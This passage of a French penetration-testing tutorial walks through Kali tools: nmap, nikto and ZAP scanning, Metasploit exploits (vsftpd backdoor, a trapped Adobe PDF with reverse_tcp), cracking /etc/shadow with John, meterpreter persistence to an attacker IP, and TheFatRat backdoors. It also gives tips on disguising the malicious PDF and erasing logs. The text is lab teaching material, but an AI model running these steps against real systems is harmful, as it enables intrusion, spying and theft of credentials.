+</p><p id="c8f9a0a5-ac12-4f1c-87e4-340d3b1d8750" class="">Des modules nécessite des information comme des clé API, des ip etc. Pour voir quelle information le module a t il besoin, taper:</p><pre id="ebe389a0-faaa-48be-9e70-8aa8cb9e9f4b" class="code"><code>options list</code></pre><p id="59ac57f2-b70a-452e-8210-7c84602c4ee7" class="">
+</p><p id="34575084-4afb-46e6-8c21-93522d89bff9" class="">Il suffit maintenant de définir des option demandée par le module avec: </p><pre id="7d685907-6c68-485d-80e9-51ecf7bf6cb9" class="code"><code>options set &quot;NOM DE L&#x27;OPTION&quot; &quot;reponse de l&#x27;option&quot;</code></pre><p id="7b6d3a2d-fa83-4872-8722-28e765f336f7" class="">
+</p><p id="02a8cf36-b5b2-43c0-b31d-2324a9631498" class="">Et de lancer le module avec:</p><pre id="c1fea2e9-0d34-48bc-b631-26b37b796c30" class="code"><code>run</code></pre><p id="690c2f49-2bdf-4f15-a5ac-dc950ded3393" class="">
+</p><p id="dc0939b2-ba34-438c-9868-a5258b52f7dc" class="">Certains modules demande une clé d&#x27;api d&#x27;un service. Vous pouvez l&#x27;ajouté grâce à:</p><pre id="82f16427-00eb-4b00-9e3b-9261c3fd9df9" class="code"><code>keys add &quot;nom du service&quot; &quot;clé api du service&quot;</code></pre><p id="0582d69a-b266-4578-bc97-5e470dda95c6" class="">
+</p><p id="98ded6a9-451c-44c0-af1f-22e5b90a9c73" class="">Vous pouvez sortir du module avec</p><pre id="07bba3dc-a782-4703-b903-06a1c71df7d3" class="code"><code>back</code></pre><p id="599e5f45-5c0f-409a-ba5f-6fdb4d1dc846" class="">
+Des information complémentaire sur l&#x27;utilisation de recon-ng sont disponible en français sur</p><p id="3f010258-82b1-4578-be23-e4bdd9513029" class=""><a href="http://quack1.me/recon-ng.html">http://quack1.me/recon-ng.html</a></p><p id="29f9e29a-88fe-410d-9ee5-ac6da37c8da7" class="">
+</p><h2 id="1c337fe9-b13d-4f78-bac0-11cd91ac424e" class="">Scanning réseau et web</h2><h3 id="1ffce7c7-e8f3-4341-ad5c-7f204cc513e0" class="">Scanner un réseau et ses services</h3><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="2696727b-d7e9-4641-98b2-f8b8152ad948"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Il existe plusieurs types de scan réseau:  Le ping sweep pour identifier les machines répondant sur réseau, le scan de port qui identifie les service qui écoute sur certains ports, et le network mapping qui sert à se représenter l&#x27;architecture d&#x27;un réseau et le rôle de chaque machine</div></figure><p id="1594e05f-295e-4e53-a718-0d872f33ccc7" class="">
+</p><ul id="23071aac-10e6-4ef1-b66a-be3fc5bda192" class="bulleted-list"><li><strong>Nmap</strong></li></ul><p id="b7ec0879-282b-4890-8277-5b28424dfdaa" class="">Nmap est un scanneur de ports très complet qui permet de récupérer
+beaucoup d’informations grâce aux nombreuses options et paramètres qu’il
+offre. Voici les commandes principales utilisées ainsi que leurs rôles.</p><p id="803136a4-e128-41db-af7d-e691c47e4de9" class="">
+</p><p id="465ae49c-fe17-4575-ac8d-0a46de34794a" class="">La commande suivante ping une adresse ou un domain:</p><pre id="4d3e4416-7ded-4545-9fe9-e1197c3c6bfc" class="code"><code>nmap -sP &quot;IP/domain&quot; </code></pre><p id="455fad3a-4d5a-41b0-85f3-0014cbebb22f" class="">
+</p><p id="24d96ae1-20f5-4fc8-b2b8-51dd2abba88f" class="">Pour scanner les ports d&#x27;un services, il faut rentrer cette commande:</p><pre id="18828581-01d4-4650-a5bf-7cce138e3c94" class="code"><code>nmap -sS &quot;IP/domain&quot; </code></pre><p id="c699e2fa-9d72-43cd-a20c-262fd22a0d20" class="">
+</p><p id="31f43493-98c9-4336-a5f5-ec1797d35d9a" class="">On peut aussi scanner les port et identifier la version d&#x27;un service en tapant:</p><pre id="4d760733-1b12-407d-8aab-0302cd618f51" class="code"><code>nmap -sV &quot;IP/domain&quot; </code></pre><p id="f3724a9f-24a5-42bd-a070-2461feea3930" class="">
+</p><p id="f45db468-2a0c-4b59-8543-0897ffda5259" class="">Si les info recherchées ne sont pas trouvé, on peut taper cette commande pour avoir plus d&#x27;info</p><pre id="fa57e129-acf2-48c3-bdec-5c4cb27cb317" class="code"><code>nmap -v &quot;IP/domain&quot; </code></pre><p id="9474cfa1-4bbf-4395-b803-f83d56dfedf5" class="">
+</p><p id="50b0fdf2-b327-465d-8231-2b3482fd1c71" class="">Certaine commande sont plus efficace mais sont facilement détectable donc plus risqué</p><pre id="d39efe01-ff0b-41c1-bd32-4bcbf4f025da" class="code"><code>nmap -A &quot;IP/domain&quot;</code></pre><p id="16a06b3c-4b25-4b97-aca6-e2a810008fa5" class="">
+</p><h3 id="c46596b2-f966-46aa-8c61-c2d2ad9730af" class="">Trouver une vulnérabilité web</h3><ul id="691ba5fa-b37c-4aa6-84c8-5fb8ee46729e" class="bulleted-list"><li>Nikto</li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="1168f501-6e6a-4b26-89b5-dc9a2d75526d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Nikto est un scanner de vulnérabilité simple et open source. </div></figure><p id="4b384c53-c70c-44cf-b06d-07e7d1207401" class="">
+</p><p id="ae4cbbbd-aa67-4c3e-8413-a0fe6ae28107" class="">Il liste les service ainsi que leurs version suceptible d&#x27;être vulnérable. On peut rechercher sur google ces version pour voire les vulnérabilité de cette derniere</p><p id="0541d2f1-b04a-410e-9f84-ec141f3978ed" class="">Il liste aussi des faille diverse. Ces vulnérabilité se voie attribuée un code qui les précède. On peut le taper sur google pour en apprendre plus sur celles-ci </p><pre id="63867429-c6ef-4e08-88cd-011b14a3c2f1" class="code"><code>nikto -h &quot;url/ip&quot;</code></pre><p id="752530bc-045a-4d07-9809-cef8b18933ef" class="">
+</p><ul id="9884446b-6d53-4e8d-bd37-043a33b58560" class="bulleted-list"><li>OWASP Zed Attack Proxy (ZAP)</li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="5fa9596f-bef9-45fa-ab04-fe3f66b2442b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">OWASP ZAP est un outil Java permettant de tester la sécurité des applications Web. Il possède une interface graphique intuitive et de puissantes fonctionnalités permettant de fuzzing, de scripting, de spidering, de proxy et d’attaque d’applications Web. Il est également extensible à travers un certain nombre de plugins.</div></figure><p id="074a94bd-6578-4c8b-a724-e56f401f4217" class="">
+</p><p id="c2de1c60-d22e-4e99-99c1-dc1d35270e22" class="">OWASP n&#x27;est pas par défaut sur kali. Il faut donc télécharger le linux installer à cette adresse :</p><p id="3480c875-1b36-4131-a483-b0de753c7b12" class=""><em><a href="https://www.zaproxy.org/download/">https://www.zaproxy.org/download/</a></em></p><p id="997b30fb-5cf6-44a5-8a19-84cba7865f2e" class="">Puis dans un terminal, se rendre dans le dossier download avec :</p><pre id="636a85e6-d2b0-485f-91e5-e2a866dc52ee" class="code"><code>cd download</code></pre><p id="00b47bde-9afc-42e4-8945-a245b09170cb" class="">
+</p><p id="55a875d7-8c22-4bb5-ae45-2c6e5ea3d402" class="">Le rendre exécutable avec :</p><pre id="c21e70cd-faec-4862-8d98-ce2c90f8281b" class="code"><code>sudo chmod +x ZAP_2_8_0_unix.sh</code></pre><p id="262009f9-1b47-4aba-8e7e-ddd8b7bbde5c" class="">
+</p><p id="16a08334-acd4-4805-ad02-24c746c9dda6" class="">Et exécuter avec :</p><pre id="db619690-6e80-4518-8dac-3e7cc726fc71" class="code"><code>./ZAP_2_8_0_unix.sh</code></pre><p id="cd52b315-dbf8-41f5-b15f-db345a9cce39" class="">
+</p><p id="70ac7468-59fc-4cd4-97c5-0fa5bf6b8375" class="">Il recherche alors des mis à jour au lancement et vous demande si vous souhaitez sauvegarder votre session. Cliquer sur &quot;Oui, je veux sauvegarder cette session avec un nom basé sur l&#x27;horodatage actuel.&quot;</p><p id="8062caf7-ba18-4434-9eb2-3629f9b4ee64" class="">
+</p><p id="2db47c72-ac18-47c9-9f5c-a535b0fd737e" class="">Pour lancer un scan, cliquer sur &quot;Automated Scan&quot; et rentrer le domain ou l&#x27;ip à scan. Cliquer sur &quot;attaquer&quot;.</p><p id="c7bd31b9-abc7-41cf-8221-40d4f4539b41" class="">
+</p><p id="a245e9eb-6148-4e60-abfa-eaf86a39f5f9" class="">Tous en bas se trouve 4 drapeaux de couleurs différentes. Cela représente les vulnérabilité les plus critique pour le rouge et les moins prioritaire pour le jaune (on ne se sert pas du bleu).</p><p id="26f7020e-3d19-4b7d-8200-3140baff6f02" class="">
+</p><p id="19cc618d-0350-4e6e-9f74-6cbbe81d5056" class="">Vous pouvez consulter les vulnérabilité trouvé dans l&#x27;onglet Alertes. Elle sont classé dans des dossier déroulant. En déroulant le dossier et en cliquant sur une vulnérabilité, on obtient un bilan de la faille: son <strong>url</strong>, sa <strong>criticité</strong>, ses<strong> identifiant</strong>, la <strong>source utilisé</strong> pour trouver la faille et une <strong>description de la faille</strong></p><p id="3ffd735b-54cb-46a5-ab9f-d16239bdc4b9" class="">
+</p><p id="91d331b6-47c1-42d4-a30e-af4cf28022e0" class="">Dans l&#x27;onglet &quot;Robot d&#x27;indexation&quot;, La colonne traité, comme son nom l&#x27;indique, nous informe sur l&#x27;état de scan. La colonne méthode indique la méthode que OWASP ZAP utilise pur trouver cette faille et l&#x27;url indique l&#x27;url de la faille.</p><p id="25d04106-6560-4ff5-9c56-90e82c34ac6b" class="">
+</p><p id="c57ee01e-a05b-433c-a6f3-f778c86b10dd" class="">Une fois le scan fini ou arrêté, on peut afficher un bilan de ce dernier en cliquant sur l&#x27;onglet scan actif puit l&#x27;icone graphique à gauche de la barre de progression</p><h2 id="f67919e9-30ab-47ad-bcd6-5dce67a1a116" class="">Gagner accès 🔑</h2><p id="1171de38-d62a-4242-98ba-b5010f639309" class="">Il y a beaucoup de façon de gagner l&#x27;accès. On peut exploiter de façon directe une vulnérabilité (avec métasploit), exploiter une faiblesse quelconque (crack de mot de passe, élévation de privilège), utiliser des logiciels espions (spyware, keylogger), exploiter des failles humaine (S.E ou ingénierie sociale). Pour maintenir l&#x27;accès, on utilise des programme de post exploitation ou des backdoor (porte de sortie) pour faciliter l&#x27;accès. Il est important de rester discret après l&#x27;exploitation afin de garder le contrôle en supprimant des fichiers logs/sauvegardes.</p><h3 id="1efd3ab4-1e7e-4211-b3a2-397f37a27798" class="">Exploitation de vulnérabilité</h3><ul id="7855a065-4367-499e-bed4-581332b3d135" class="bulleted-list"><li><strong>Métasploit</strong></li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="71b0d0f2-1304-4ba9-9fdc-a1b3a6d35a25"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Métasploit est un environnement de test d&#x27;intrusion maintenu par Rapid7. Il est décliné en plusieurs version dont Métasploit Framework.</div></figure><p id="3c355bfe-36ea-44df-b3c7-1638cc2da07e" class="">
+</p><p id="6be3f23e-03ff-41aa-a7f1-59f7d2458c7c" class="">Avant de l&#x27;utiliser, il faut le mettre à jour avec :</p><pre id="5ddc69f5-9848-4ae9-9572-4fd4ca6976fb" class="code"><code>sudo apt-get update</code></pre><pre id="4c1f8f95-8ba2-4d0c-b20a-33cac17d3987" class="code"><code>sudo apt-get install metasploit-framework</code></pre><p id="82c4d1f3-669e-4daa-8e90-797c27126878" class="">
+</p><p id="a3ac79e9-2ce3-422d-9712-c0d4f054e168" class="">On peut maintenant le lancer avec:</p><pre id="d9a344a3-24b8-4752-9ca0-df93984007dc" class="code"><code>sudo msfconsole </code></pre><p id="3c2eba35-98e9-4ebe-a1b5-8ad7c6c07cac" class="">
+</p><p id="4a2b64e8-55ba-4878-853b-90343bebe5e8" class="">Le lancement peut prendre un peu de temps. Pour connaitre les commandes utilisables dans le framework, taper:</p><pre id="f76a835a-ea91-451a-8068-fe017ee874ff" class="code"><code>help</code></pre><p id="6966593c-9e36-4403-8de0-01e1e4564940" class="">
+</p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="e1a50c76-2fbf-4228-bc57-f63446b18fe9"><div style="font-size:1.5em"><span class="icon">⚠️</span></div><div style="width:100%">Dans cet exemple, je vais attaquer ma machine métasploitable. Cet machine m&#x27;appartient et est sur mon réseau.</div></figure><p id="fac3cc11-2a22-4eac-8c0d-995a1238dbb9" class="">
+</p><p id="152c0b88-473a-4d61-abfe-f87a604148a5" class="">Pour rechercher un module, taper </p><pre id="1c93ea72-5520-454a-be2f-6f464088f5f7" class="code"><code>search &quot;nomdumodule&quot;</code></pre><p id="2dd278a7-27ff-46aa-9769-d3861e677815" class="">
+</p><p id="4d7f769f-2c1d-4760-a512-b43eaf316b03" class="">Un module et son chemin d&#x27;accès s&#x27;affiche. Pour avoir des information sur le module, il faut taper:</p><pre id="adc0a34a-afbd-428a-bb74-b41e53d516f0" class="code"><code>info &quot;chemindumodule&quot;</code></pre><p id="8a75db7b-4c67-4e19-92fa-68b1bd4fa91a" class="">
+</p><p id="0da0e015-c893-4f31-beb9-752e27638e8b" class="">Des infos utiles apparaisse comme la plateforme visée et le rang qui montre la facilité d&#x27;exploitation. Plus bas, on retrouve les options. Comme pour recon-ng, métasploit à besoin d&#x27;option pour exécuter un module. Pour entrer ces option nécessaire et executer le module, taper:</p><pre id="e155f786-8919-4dac-9ea6-8805b986ea69" class="code"><code>use &quot;chemindumodule&quot;</code></pre><p id="c9cf9569-e5c5-4a66-a0b5-242235ec3b90" class="">
+</p><p id="b9c5067d-7b0a-45db-b1e7-17fe3e49d43a" class="">Vous pouvez taper show options pour voire les option requises</p><p id="9c20395b-1a2a-42d4-bcbd-5825a5a98b21" class="">Pour définir une option, il faut rentrer:</p><pre id="c70edc9c-9c72-4021-b4d8-ae19efd690af" class="code"><code>set &quot;nom de l&#x27;option&quot; &quot;valeurs de l&#x27;option&quot;</code></pre><p id="b854bda1-3cde-48d6-821d-ce0832396781" class="">
+</p><p id="a1138d42-d7a0-46b8-94a7-17947e05ff9a" class="">Il n&#x27;y a plus qu&#x27;a taper la commande suivante pour lancer le module</p><pre id="b4d576c8-8b90-400c-9b8b-2b22a21daa2d" class="code"><code>exploit</code></pre><p id="82795003-3595-402e-98ae-e313e5b44088" class="">
+</p><p id="158be32e-91c3-4317-a822-be63761d5995" class=""><strong>Exemple d&#x27;exploitation</strong></p><p id="1615f46b-3cf6-443e-9162-d9a7b0f1309e" class="">Je vais à présent exploiter une faille sur une machine métasploitable (le lien est en haut). Je vais passer la phase de reconnaissance car ce n&#x27;es pas le sujet de cet partie. Parton du principe que j&#x27;ai plusieurs informations : Son adresse ip, la version d&#x27;un serveur ftp qui tourne dessus et son port utilisé. Je peux avec ça me donner un accès root (admin) sur le terminal. Voila les lignes rentrées:</p><p id="7fc43033-3d7e-448e-99a4-93998011cda0" class="">
+</p><pre id="7be3c896-1998-427e-9b17-9bc82f4b7d05" class="code"><code>sudo msfconsole</code></pre><pre id="9d4428b5-c0c6-494c-8fb9-7f871b219589" class="code"><code>search vsftp</code></pre><pre id="c5659d73-f733-4acb-a06a-2bc14a633ded" class="code"><code>use exploit/unix/ftp/vsftpd_234_backdoor</code></pre><pre id="988c8c07-2820-49d5-9471-f0633f096fa2" class="code"><code>show options</code></pre><pre id="860aff0e-f96a-4ff7-a9f7-9d99dfde0967" class="code"><code>set RHOST 192.168.1.61</code></pre><pre id="38b1797f-0282-4268-ac2a-2cd261909227" class="code"><code>set RPORT 21</code></pre><pre id="69ed341d-ae56-4250-9a98-1f08b6625439" class="code"><code>exploit</code></pre><p id="6ea5b072-a2fd-4232-a221-a67f47dbad30" class="">
+</p><p id="44106789-dfd4-49db-ace7-e621749544b8" class="">Et voila! J&#x27;ai maintenant un accès en ligne de commande à la machine. On peut lancer toute les commande disponible dans linux. </p><p id="fe960432-660d-4c3f-ae89-9f956484bb6e" class="">
+</p><p id="90745d3a-5d64-41a9-9085-7404b201f87f" class="">Métasploit possède aussi des module auxiliaire servant au scanning. On peut les lister avec </p><pre id="2a00a9e9-e5e6-4802-95e9-09f93dc25036" class="code"><code>use auxiliary/scanner +TAB</code></pre><p id="c2750484-2a68-4ddb-aefa-633d10d26c3f" class="">
+</p><p id="4848e44b-39fa-458e-a2d0-d0fd7b6dea60" class="">On peut également voire les payloads:</p><pre id="502d7e10-99fb-46b0-b14f-7e623a337e0e" class="code"><code>show payloads</code></pre><p id="28fe4e11-ca4b-4cdf-928d-64da0e06858a" class="">
+</p><p id="687f6824-75aa-4f58-8b76-d8dc752f2fb8" class=""><strong>Pirater une machine Windows virtuelle</strong></p><p id="542d52cf-d709-46f6-b036-d68561e4cd0b" class="">
+</p><p id="e000ccf2-f519-4fd2-9581-14dc13a088bf" class="">Dans cette partie nous allons exploiter une vulnérabilité présente sur les machine possédant le logiciel adobe reader 9. Cette vulnérabilité à bien entendu été patché dans les version suivante mais reste disponible sur celle ci ( d&#x27;ou l&#x27;interet de mettre à jour ces logiciel)</p><p id="18b71585-8117-4ebb-8e15-432fecc94151" class="">
+</p><p id="caaa9986-17ac-473a-a73a-0be8a2c51f4f" class="">Partons du principe que la phase de reconnaissance à été effectuée. Nous connaissons l&#x27;os du la victime (Windows) son addresse ip, et nous sachons qu&#x27;elle execute une version vulnérable d&#x27;abode reader. Après quelque recherche, on a trouvé un exploit pour cette faille.</p><p id="045d705c-3fc1-4c84-a3de-18c5c9dae068" class="">
+</p><p id="eb6f65be-8815-406d-81c4-2c8576a7d88c" class="">Dans msfconsole, taper:</p><pre id="1c099028-4779-41db-b4b3-28d0ef65ebe5" class="code"><code>use exploit/windows/fileformat/adobe_pdf_embedded_exe</code></pre><p id="32687f22-4af7-46ff-93ad-ec77b4252308" class="">
+</p><p id="06eca03a-f39d-4862-93e1-dc298a60550a" class="">On affiche les options avec: </p><pre id="bbb333b9-b92a-401b-949d-cfb46242cb1a" class="code"><code>show options</code></pre><p id="99ef39ec-37fb-4766-b294-c18b55c2ba70" class="">
+</p><p id="83dfb461-d866-45e6-be28-03255c6b611b" class="">On voit alors 4 options dont 1 requise. L&#x27;options EXENAME defini quel payload va être injecter suite a l&#x27;exploitation de la faille. On le laisse par défault. FILENAME est le nom du faux fichier pdf qui va contenir le payload. Il se nomme par défault &quot;evil.pdf&quot;, je conseille donc de le changer pour paraitre moin suspect. LAUNCH_MESSAGE va être le message d&#x27;erreur afficher quand l&#x27;utilisateur va ouvrir le pdf piégé. On peut le laisser par défault ou le changer. </p><p id="b6774a26-7404-47d9-ad0b-01b901722f8f" class="">
+</p><p id="5bbf5cc3-8edc-40a0-882f-a6042fcdeb42" class="">On peut maintenant lancer l&#x27;exploitation avec:</p><pre id="0c8a4ed5-4219-4b18-a383-0c7ddc81b204" class="code"><code>exploit</code></pre><p id="7e8061c4-a469-49ef-9af7-dc38fba22524" class="">
+</p><p id="0a5519ec-65b1-4845-a14b-14b248f5b18c" class="">Un fichier pdf viens d&#x27;être crée dans le dossier /home/kali/.msf4/local. La console nous indique aussi qu&#x27;il utilise un payload de reverse_tcp.</p><p id="e7e37cce-ef6b-4a9e-8a53-049703aed7cb" class="">
+</p><p id="b01c4bee-6ad9-401b-b78f-9938460cf80c" class="">Il faut maintenant préparer le handler. Il sert à &quot;écouter&quot; et à envoyé les évenement à la victime une fois que cettte dernière à ouver le pdf. Pour cela taper :</p><pre id="2ccaf4e6-f72a-46a3-84a4-824310abac89" class="code"><code>use exploit/multi/handler</code></pre><p id="e6135fdd-d529-491b-ac3e-faf63c861848" class="">
+</p><p id="91abe218-152f-4a9a-9253-7775d6346617" class="">Et bien sur :</p><pre id="3290dd09-9772-4a46-b032-4378fcef9761" class="code"><code>exploit</code></pre><p id="ec66e2b5-b234-4c38-88ce-96022da136cc" class="">
+</p><p id="3823d6e5-a84d-473b-a3f5-9d0bc58f65ea" class="">
+</p><p id="c8ae8be2-57e2-4e86-b636-0a112b79990c" class="">Dès que la victime ouvrira le pdf, adobe affichera une erreur et l&#x27;utilisateur sera obligé de cliqué sur open pour continuer. Ceci étant fais, la victime est maintenant &quot;infecté&quot;. Elle peut supprimé le document cela ne changera rien.</p><p id="5ed0a2e7-9d4d-4f7d-b72e-475302701c78" class="">Si l&#x27;on reviens sur la console, on peut voir qu&#x27;une session meterpreter à été ouverte. On peut voir toutes le commande disponible avec la commande</p><pre id="db0267d9-5f10-439a-b42f-b0a6afdac3eb" class="code"><code>help</code></pre><p id="a14e589f-00de-47cf-bc84-fe00ab56104c" class="">
+</p><p id="89dca17a-9d4a-46ce-939d-4b68b014e9c2" class="">On peut par exemple enregistrer les frappe de clavier, filmer la webcam, lancer des app, contrôler les fichier ect...</p><p id="ff00e4e9-da17-4232-9d5b-2289a842b3d2" class="">
+</p><ul id="a20a6335-25da-4574-8ac9-a0f69c91d7f5" class="bulleted-list"><li><strong>Cracker un mot de passe avec John</strong></li></ul><p id="1ea96a59-c000-4350-a9cc-4a0bb0c08cfa" class="">John est un outil préinstaller dans kali qui permet de cracker les mot de passes d&#x27;un système. Il fonctionne en 3 modes différents: le mode single, word list et brutforce. </p><p id="cac30654-9f60-4f5b-94f8-df0eacd73e80" class="">Pour augmenté les chance de réussite, il est recommandé de récupérer les mot de passe chiffré du systeme. Après avoir obtenu un terminal sur une machine métasploitable, on peut afficher les 2 fichier qui contiennent les mot de passe avec :</p><pre id="70a073f0-26cd-46f4-adfc-30e94de9b27f" class="code"><code>cat /etc/passwd</code></pre><p id="ee3a1c50-58ef-4df8-9b0c-71ea014b04e0" class="">et </p><pre id="ee434927-8ab2-40c3-8b2a-e4a427b992ef" class="code"><code>cat /etc/shadow</code></pre><p id="1f32bf26-cbf8-44f5-89ba-a7aa28db0b6d" class="">
+</p><p id="93c5bcfb-4819-456e-95df-1a9e4378e735" class="">Copier ses donnée dans 2 fichier texte ( passwd.txt pour le données passwd et shadow.txt pour les données shadow) situé sur le bureau de kali. On peut maintenant les fusionner avec la commande</p><pre id="54da13e0-4d46-4167-a1c4-f6ffdfbb8ec2" class="code"><code>cd Bureau </code></pre><p id="7ccb0adf-deba-44e2-bee6-6468bda2e837" class="">puis </p><pre id="d7f7ae2b-aae1-4268-a655-aee24a818b63" class="code"><code>unshadow passwd.txt shadow.txt &gt; pass.txt</code></pre><p id="c7eebebe-c615-4aa3-bc53-528c1608e259" class="">
+</p><p id="1f9332b5-c70d-4ce2-b567-cf31aa4960d8" class="">Une fois toute ses info réunis, il ne nous reste plus qu&#x27;a lancer john sur cette passwordlist:</p><pre id="0cbe7d7d-1350-48f2-a422-ff437830e7e3" class="code"><code>john pass.txt</code></pre><p id="92863caf-63bb-4974-a21f-1dd2982a67dd" class="">
+</p><p id="6b2dfd0e-ed8c-4d7a-803f-43b5cac65d5d" class="">Le programme travail et nous a afficher en moin d&#x27;une seconde 2 utilisateur avec leurs mot de passe. On peut stopper la session avec Ctrl+C</p><p id="db8e3470-1132-446a-89c3-66bec659bda1" class="">
+</p><p id="32729edb-0372-4ab6-b4b6-95d22a1e6581" class="">On peut aussi demandé à John de cracker le mot de passe d&#x27;un utilisateur spécifique avec</p><pre id="5aef5079-2ad4-4dc9-8b37-71aedb396726" class="code"><code>john pass.txt —users=&quot;Utilisateur&quot;</code></pre><p id="2394764a-b783-456f-a15f-30fad0015302" class="">
+</p><h3 id="b3eb3bbe-5e76-4a95-9233-1cf736aa1108" class="">Post-exploitation et persistence</h3><p id="a11183a0-b183-4386-b44c-e0a1e0d62902" class="">La post-exploitation est une étape importante pour un pirate. Durant cette phase, on tente de mettre en place un moyen de garder l&#x27;accès à la machine pour le future. On appelle ça la persistance. Toujours dans l&#x27;exemple dernier, on part du principe que l&#x27;exploit a fonctionner et que l&#x27;on a obtenu une session meterpreter. </p><p id="ed7c3ef9-6428-4418-a6a1-17b955e132e5" class="">
+</p><ul id="c46d1f76-4e8d-4f3d-8d32-a6a48ae77943" class="bulleted-list"><li><strong>Persistance par meterpreter</strong></li></ul><p id="48dfdb46-ea73-4906-81d2-6b6ef23bc369" class="">Meterpreter intègre un module de persistance. On peut voir les options disponible en tapant:</p><pre id="00b6c31a-4497-4b70-8dbe-4624d58d9b44" class="code"><code>run persistence -h</code></pre><p id="dc5cd2b3-7348-4905-873c-c6e41270cd90" class="">
+</p><p id="17172478-7a5b-4402-bad2-e55a022ea0e5" class="">Un message nous dis que ce module de persistance est obsolète et qu&#x27;une nouvelle commande est disponible. Nous le testerons par la suite. Dans notre cas le module actuel fonctionne. Le terminal affiche aussi les options qui contiennent des argument à placer après la commande ainsi que leurs rôles. En tapant :</p><pre id="3bdb714d-dbd3-41d7-9eb5-8fb8b740ed64" class="code"><code>run persistence -A -U -i 10 -p 7777 -r 192.168.1.47</code></pre><p id="1f9d93e4-e649-4590-977f-96d2e62808f8" class="">je choisi de démarrer un session handler sur la machine de la victime avec l&#x27;agrument -A, d&#x27;executer l&#x27;infection automatiquement au démarrage de la machine avec l&#x27;argument -U et d&#x27;effectuer une tentative de connexion toute les 10 secondes avec -i suivie de 10. Je défini aussi le port sur lequel va s&#x27;initialiser la session handler (ici 7777 mais on peut mettre ce que l&#x27;on veux tant qu&#x27;il n&#x27;est pas pris) et l&#x27;adresse de kali avec l&#x27;argument -r suivi de mon ip.</p><p id="80fc6193-6367-4d33-b9b4-a5f93a94fd59" class="">
+</p><p id="90c4bbc1-f021-406a-b733-e13079b5e97f" class="">On peut maintenant appuyer sur entrer pour mettre en place notre système de persistence. Nous avons maintenant un accès persistant à la machine de la victime</p><p id="3ac0c54b-7efa-40c4-8fbe-be7f15e4747b" class="">
+</p><ul id="d32b17c8-03e5-4f8c-a19f-143a6b96fab2" class="bulleted-list"><li><strong>Persistance par  The Fat Rat</strong></li></ul><p id="ed4ab63e-bd71-4378-a778-74a1a5b8e36e" class="">The Fat Rat est un utilitaire permettant de crée entre autre des programme malveillant installer des backdoors (ou portes dérobées) garantissant un accès persistant à la machine de la victime. </p><p id="89f4345f-e48e-4865-9d18-3013751644cb" class="">
+</p><p id="3beb959b-81d4-462f-ad21-98170e2c6631" class="">Cet outils n&#x27;es pas installer par défault dans kali. Il faut donc l&#x27;installer à partir de son dépot git à l&#x27;aide des commandes suivantes.</p><p id="a5557cc0-bfa8-48ab-9c61-fb51eb2d6541" class="">On télécharge les fichiers:</p><pre id="e5dc0e7f-96a8-4bf3-948c-00a8957e4196" class="code"><code>git clone <a href="https://github.com/Screetsec/TheFatRat.git">https://github.com/Screetsec/TheFatRat.git</a></code></pre><p id="13457cee-dd24-44f9-b838-f161c8aaec7e" class="">
+</p><p id="f05e88f2-cd0c-4b01-ac3a-5860d2b39131" class="">On se rends dans le dossier du programme:</p><pre id="a6484972-b842-45b1-90c2-f7ff495582fb" class="code"><code>cd TheFatRat/</code></pre><p id="64d8b562-0167-4b9c-9203-4309cbaf9f5d" class="">
+</p><p id="69adad3d-fad9-40df-bb0a-82c628a30358" class="">On rends l&#x27;installateur executable:</p><pre id="9259684c-1b25-4007-bb07-75a93d79c70c" class="code"><code>chmod +x ./setup.sh</code></pre><p id="cdcc599f-477c-481a-942f-c667abd2d8d2" class="">
+</p><p id="04fe4bc1-f000-428d-bdc4-b1e7f4e8bf14" class="">et on le lance:</p><pre id="3846d927-e0ec-4ac8-937c-3a189ea92177" class="code"><code>./setup.sh</code></pre><p id="3f8dbb36-7b2b-438d-abc3-d2b96b374a9f" class="">
+</p><p id="01eedcde-233e-4dd8-9c34-c4a7d70ec59e" class="">L&#x27;installation peut prendre du temps donc soyez patient. Une fois installé, on peut le lancer avec  la commande:</p><pre id="96a04753-bba9-449d-9093-ccd71cdea190" class="code"><code>fatrat</code></pre><p id="0bb49f41-6f01-435a-be92-13b2deb30650" class="">
+</p><p id="46f25bdc-83ed-436b-9ac3-d665be6d7857" class="">On appuis sur entrer jusqu&#x27;a arriver dans l&#x27;accueil. On vois alors une liste d&#x27;option énumérée ainsi que leurs description.  Certaine contienne le mot &quot;FUD&quot;. Cela signifie Fully UnDetectable. </p><p id="a67e9dda-155f-4ee5-816b-0a8ea165aca7" class="">On tape 6 puis entrer puis 1 et encore entrer. On nous demande la variable LHOST qui est notre adresse ip et LPORT qui est un port non utilisé. On peut nommé le backdoor et choisir le payload utilisé (ici reverse tcp)</p><h2 id="277b2b21-c6ac-4d5b-a237-3472079bd409" class="">Ingenierie sociale 👂</h2><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="bac8fe4d-969e-4c61-9e5d-723e4c118b3c"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">L&#x27;ingénierie sociale (social engineering en anglais) est, dans le contexte de la sécurité de l&#x27;information, une pratique de manipulation psychologique à des fins d&#x27;escroquerie. Elle se base sur les interaction humaine et sur l&#x27;influence. C&#x27;est la clé de réussite du piratage. </div></figure><p id="abb77ad5-3584-4557-9e9a-41798d304dda" class="">
+</p><h3 id="2fc9e357-3789-40a8-b198-f2f5dd699b67" class="">Utilisation basique du SET</h3><p id="bf79d499-7b10-4bbf-a37a-77d30eb22f4a" class="">SET est un outil permettant d&#x27;automatiser des techniques d&#x27;ingénierie sociale. Il se lance en allant dans le menu Application &gt; Outils Exploitation &gt; social engineer toolkit. il vous suffit de taper le numéro en question pour accéder à un menu, ou &quot;99&quot; pour en sortir.</p><p id="26792622-4a2e-4785-97c9-a5b32afb33c9" class=""> Vous pouvez par exemple sélectionner &quot;1&quot; pour vous rendre dans &quot;Social-Engineering Attacks&quot; puis &quot;2&quot; pour sélectionner &quot;Website Attack Vectors&quot;. </p><h3 id="64481fd8-cc5a-42c9-926b-37e40d2bd379" class="">Le Phishing</h3><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="c674d4c1-a123-4d95-84be-5cf3c8b876b5"><div 